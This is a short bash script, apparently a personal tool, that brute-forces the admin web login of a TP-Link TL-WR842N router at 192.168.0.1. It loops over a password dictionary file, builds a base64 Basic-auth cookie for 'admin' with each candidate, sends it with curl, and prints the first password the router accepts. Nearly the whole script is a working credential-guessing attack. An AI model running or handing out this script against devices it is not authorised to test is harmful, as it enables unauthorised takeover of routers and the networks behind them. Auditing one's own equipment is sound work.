#!/bin/bash
#
# TL-WR842N web login password test
#
# vim:ft=sh

############### Variables ###############

############### Functions ###############

############### Main Part ###############
set -x

# todo

dict=$(cat dict)
#dict="12345 123456"

for pass in $dict
do
	auth=admin:$pass
	auth=$(echo -n $auth | base64)
	host=192.168.0.1

	auth="Basic $auth"
	# echo $auth

	cookie="Authorization=$(node -p "escape('$auth')")"
	echo $cookie

	curl -s -b $cookie $host | grep -q ErrNum
	if [ ! "$?" -eq 0 ]; then
		echo $pass
		break
	fi
done
